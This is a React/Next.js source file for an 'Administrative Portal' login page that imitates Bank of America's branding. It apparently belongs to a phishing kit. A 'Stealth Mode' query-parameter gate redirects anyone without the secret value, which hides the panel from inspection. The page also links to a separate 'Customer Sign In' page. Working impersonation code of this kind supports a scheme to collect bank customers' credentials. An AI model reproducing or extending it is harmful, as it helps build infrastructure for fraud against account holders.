'use client';

import { useState, useEffect, Suspense } from 'react';
import { useRouter, useSearchParams } from 'next/navigation';
import Button from '@/app/components/ui/Button';
import Link from 'next/link';

function AdminLoginContent() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');
  const router = useRouter();
  const searchParams = useSearchParams();

  // Stealth Mode: verify access token
  useEffect(() => {
    const access = searchParams.get('secure_access');
    if (access !== 'v1') {
      router.replace('/');
    }
  }, [searchParams, router]);

  const access = searchParams.get('secure_access');
  if (access !== 'v1') {
    return null; 
  }

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setError('');

    try {
      const response = await fetch('/api/admin/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password }),
      });

      const result = await response.json();

      if (result.success) {
        router.push('/admin/dashboard');
      } else {
        setError(result.error || 'Invalid credentials');
      }
    } catch (err) {
      setError('An error occurred. Please try again.');
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-[#f8f9fa] to-[#e9ecef]">
      {/* Clean Header Bar */}
      <header className="bg-white border-b border-[#e0e0e0] shadow-sm">
        <div className="max-w-6xl mx-auto px-6 py-4 flex items-center justify-between">
          <Link href="/" className="flex items-center">
            <img 
              src="/asset-v1-h.png" 
              alt="Bank of America" 
              className="h-6"
            />
          </Link>
          <Link 
            href="/user/login" 
            className="text-[13px] text-[#0066b2] hover:text-[#004d8c] transition-colors flex items-center gap-1.5 font-medium"
          >
            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 19l-7-7m0 0l7-7m-7 7h18" />
            </svg>
            Customer Sign In
          </Link>
        </div>
      </header>
      
      <main className="flex items-center justify-center py-16 px-4">
        <div className="w-full max-w-md">
          {/* Login Card */}
          <div className="bg-white rounded-xl shadow-lg border border-[#e0e0e0] overflow-hidden">
            {/* Card Header */}
            <div className="bg-[#012169] px-8 py-6 text-center">
              <h1 className="text-[20px] text-white font-normal tracking-wide">
                Administrative Portal
              </h1>
              <p className="text-[12px] text-white/60 mt-1">
                Secure access for authorized personnel
              </p>
            </div>
            
            <div className="px-8 py-8">
              <form onSubmit={handleLogin} className="space-y-5">
                {error && (
                  <div className="flex items-center gap-3 p-3 bg-[#fef2f2] border border-[#fecaca] rounded-lg">
                    <svg className="w-5 h-5 text-[#dc2626] flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
                    </svg>
                    <p className="text-[13px] text-[#dc2626]">{error}</p>
                  </div>
                )}

                <div className="space-y-1.5">
                  <label className="block text-[13px] text-[#333] font-medium">
                    Email Address
                  </label>
                  <input
                    type="email"
                    placeholder="admin@bankofamerica.com"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    required
                    className="w-full px-4 py-3 border border-[#d1d5db] rounded-lg text-[14px] placeholder:text-[#9ca3af] focus:border-[#012169] focus:outline-none focus:ring-2 focus:ring-[#012169]/20 transition-all"
                  />
                </div>

                <div className="space-y-1.5">
                  <label className="block text-[13px] text-[#333] font-medium">
                    Password
                  </label>
                  <input
                    type="password"
                    placeholder="Enter your password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    required
                    className="w-full px-4 py-3 border border-[#d1d5db] rounded-lg text-[14px] placeholder:text-[#9ca3af] focus:border-[#012169] focus:outline-none focus:ring-2 focus:ring-[#012169]/20 transition-all"
                  />
                </div>

                <div className="flex items-center justify-between pt-1">
                  <label className="flex items-center gap-2 cursor-pointer">
                    <input 
                      type="checkbox" 
                      className="w-4 h-4 rounded border-[#d1d5db] text-[#012169] focus:ring-[#012169]" 
                    />
                    <span className="text-[13px] text-[#666]">Remember me</span>
                  </label>
                  <Link href="#" className="text-[13px] text-[#0066b2] hover:underline">
                    Forgot password?
                  </Link>
                </div>

                <Button
                  type="submit"
                  variant="primary"
                  className="w-full py-3 text-[14px] font-medium bg-[#012169] hover:bg-[#001845] mt-2"
                  isLoading={isLoading}
                >
                  Sign In
                </Button>
              </form>
            </div>
            
            {/* Security Footer */}
            <div className="px-8 py-4 bg-[#f9fafb] border-t border-[#e5e7eb]">
              <div className="flex items-center gap-3">
                <div className="p-2 bg-[#012169]/10 rounded-lg">
                  <svg className="w-4 h-4 text-[#012169]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
                  </svg>
                </div>
                <p className="text-[11px] text-[#666] leading-relaxed">
                  This system is for authorized use only. All access attempts are logged and monitored.
                </p>
              </div>
            </div>
          </div>
          
          <p className="mt-8 text-center text-[11px] text-[#999]">
            © 2024 Bank of America Corporation. All rights reserved.
          </p>
        </div>
      </main>
    </div>
  );
}

export default function AdminLoginPage() {
  return (
    <Suspense fallback={
      <div className="min-h-screen bg-white flex items-center justify-center">
        <div className="animate-spin w-8 h-8 border-2 border-[#012169] border-t-transparent rounded-full"></div>
      </div>
    }>
      <AdminLoginContent />
    </Suspense>
  );
}
